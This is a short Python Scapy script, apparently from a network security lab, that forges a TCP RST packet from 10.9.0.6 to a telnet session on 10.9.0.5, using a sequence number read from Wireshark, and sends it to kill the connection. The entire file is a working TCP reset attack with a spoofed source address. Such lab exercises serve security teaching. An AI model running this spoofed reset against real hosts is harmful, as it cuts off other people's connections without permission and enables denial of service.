#!/usr/bin/env python3
from scapy.all import *

# Create the IP and TCP layers
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=34472, dport=23, flags="R", seq=103597535)
# use the seq number from wireshark, "Sequence Number (raw): 103597535" 
pkt = ip/tcp

# Display packet structure
ls(pkt)
send(pkt)
